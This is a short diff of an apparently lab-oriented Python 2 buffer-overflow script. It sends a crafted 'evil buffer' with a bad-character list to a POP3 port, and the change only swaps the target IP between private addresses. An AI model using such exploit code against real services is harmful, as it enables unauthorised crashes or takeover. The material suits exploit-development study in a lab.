@@ -114,7 +114,7 @@ badchars = (
 buffer = "A" * 2606 + "B" * 4 + badchars
 try:
     print "\nSending evil buffer..."
-    s.connect(('10.11.10.27', 110))
+    s.connect(('192.168.0.10', 110))
     s.send('GET ' + buffer + '\r\n\r\n')
     print s.recv(1024)
     s.close()
